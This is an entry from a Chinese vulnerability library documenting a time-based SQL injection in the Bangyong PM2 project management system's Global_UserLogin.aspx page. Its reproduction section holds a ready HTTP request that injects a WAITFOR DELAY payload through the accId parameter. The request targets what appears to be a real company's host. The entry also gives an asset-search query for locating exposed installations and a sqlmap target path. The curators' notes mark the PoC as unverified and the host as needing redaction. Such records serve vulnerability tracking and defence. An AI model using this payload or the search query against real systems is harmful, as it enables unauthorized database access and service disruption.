---
source: "wy876 漏洞文库"
title: "邦永PM2项目管理系统 Global_UserLogin accId时间SQL 注入"
product: "邦永PM2项目管理系统"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本未知，MSSQL WAITFOR"
prerequisites: "未说明"
side_effects: "延迟探测可能占用数据库连接或影响服务"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/vcx1cgrng7y325mg"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E9%82%A6%E6%B0%B8PM2/%E9%82%A6%E6%B0%B8PM2%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FGlobal_UserLogin.aspxSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
fofa_unverified: "web.body="
hunter: "web.body=\"PM2项目管理系统BS版增强工具.zip\""
id: "vw-a8066302929c4d97c7d47657"
entity_id: "ve-a8066302929c4d97c7d47657"
schema_version: "1"
---

# 邦永PM2项目管理系统 Global_UserLogin accId时间SQL 注入

## 条目说明

- 对象与具体问题：邦永PM2项目管理系统；Global_UserLogin accId时间SQLi
- 版本、配置及部署条件：版本未知，MSSQL WAITFOR
- 认证与权限前提：未说明
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 真实公司域名Host应脱敏；Hunter查询放fofa字段
- 仅5秒延迟请求+正常路径，无时间基线/对照和返回
- 版本及修复缺，项目管理宜ERP/企业类统一

## 操作风险

延迟探测可能占用数据库连接或影响服务。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 一、漏洞简介
邦永PM2项目管理系统Global_UserLogin.aspx SQL注入漏洞，攻击者可通过该漏洞获取数据库敏感信息。

## 二、影响版本
+ 邦永PM2项目管理系统

## 三、资产测绘
+ hunter`web.body="PM2项目管理系统BS版增强工具.zip"`
+ 特征


## 四、漏洞复现
```http
GET /Global/Global_UserLogin.aspx?accId=1%27%3BWAITFOR+DELAY+%270%3A0%3A5%27-- HTTP/1.1
Host: pm2.sunwayopto.cn:8000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Length: 0
```


sqlmap

```plain
/Global/Global_UserLogin.aspx?accId=1
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/vcx1cgrng7y325mg>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
